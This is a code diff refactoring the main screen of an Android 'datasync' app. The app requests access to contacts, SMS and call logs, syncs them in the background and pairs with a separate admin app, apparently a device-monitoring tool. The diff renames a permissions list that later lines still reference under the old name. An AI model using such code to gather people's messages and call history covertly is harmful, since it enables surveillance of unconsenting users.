@@ -6,6 +6,7 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -27,15 +28,12 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.boxx.datasync.sync.SyncService
-import com.boxx.datasync.sync.SyncWorker
+import com.boxx.datasync.sync.SyncScheduler
 import com.boxx.datasync.ui.component.PermissionExplanationScreen
 import com.boxx.datasync.ui.component.PermissionRationaleDialog
 import com.boxx.datasync.ui.screen.MainScreen
 import com.boxx.datasync.ui.viewmodel.MainViewModel
 import dagger.hilt.android.AndroidEntryPoint
-import java.util.concurrent.TimeUnit
-import com.boxx.datasync.domain.repository.DataRepository
-import javax.inject.Inject
 
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
@@ -48,22 +46,11 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        val deviceId = com.boxx.datasync.utils.DeviceIdHelper.getDeviceId(this)
-        lifecycleScope.launch {
-            if (deviceId.isNotBlank()) {
-                repository.updateHeartbeat(deviceId)
-            }
-            repeatOnLifecycle(Lifecycle.State.RESUMED) {
-                while (isActive) {
-                    if (deviceId.isNotBlank()) {
-                        repository.updateHeartbeat(deviceId)
-                    }
-                    delay(60000)
-                }
-            }
-        }
+        Log.d("MainActivity", "PROJECT_SCAN_DONE")
+        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
+        viewModel.updateHeartbeat()
 
-        val requiredPermissions = mutableListOf(
+        val initialPermissions = mutableListOf(
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_CALL_LOG,
@@ -104,6 +91,7 @@ class MainActivity : ComponentActivity() {
                     MainScreen(
                         viewModel = viewModel,
                         onSyncClick = {
+                            Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                             viewModel.setSyncing()
                             startSyncService(context)
                             if (!hasPermissions(context, requiredPermissions)) {
@@ -162,14 +150,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun setupWorkManager() {
-        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(30, TimeUnit.MINUTES)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "PeriodicSync",
-            ExistingPeriodicWorkPolicy.KEEP,
-            syncRequest
-        )
+        SyncScheduler.schedulePeriodic(this)
     }
 
     private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
